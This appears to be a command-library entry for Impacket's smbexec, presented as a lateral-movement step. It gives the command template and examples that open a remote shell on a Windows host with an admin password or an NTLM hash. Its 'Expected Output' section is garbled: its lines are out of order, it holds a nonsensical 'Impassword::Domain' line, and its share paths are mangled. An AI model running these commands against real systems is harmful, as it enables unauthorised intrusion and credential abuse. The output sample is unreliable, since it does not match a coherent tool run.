---
id: 94882327-b09c-47de-936f-02f0566b8bd9
name: impacket-smbexec-interactive-shell
type: command
executor: python
data: 'python3 smbexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP'
output: null
created_at: '2023-04-06T03:56:30.990597+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - impacket
  - smbexec
  - lateral-movement
verified: true
validated: true
---

# impacket-smbexec-interactive-shell

## Command

```python
python3 smbexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Description

This command launches Impacket's SMBExec to establish a semi-interactive command shell on a remote Windows target using SMB admin shares and valid credentials. It creates a temporary service for piping input/output without leaving persistent files.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Domain name (use '.' for local) | Yes |
| $_USERNAME | Username with admin privileges | Yes |
| $_PASSWORD | Password or NTLM hash | Yes |
| $_TARGET_IP | IP address of the target host | Yes |
| -debug | Enable debug output for troubleshooting | No |

## Examples

### Basic Usage

```python
python3 smbexec.py corp/admin:Passw0rd@192.168.1.100
```

### With NTLM Hash

```python
python3 smbexec.py corp/admin:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0@192.168.1.100
```

## Expected Output

Impassword::Domain:TARGET_IP STATUS: CONNECTED\n[+] Opening SVCManager on TARGET_IP.....\n[+] Creating service BTOBTO on TARGET_IP.....\n\n\n\nImpacket v0.10.0 - Copyright 2021 SecureAuth Corporation\n\n\n[+] \TARGET_IP\ADMIN$:: {+}\\TARGET_IP\ADMIN$::\n
Type commands here, e.g., 'dir C:\\Windows' for output.
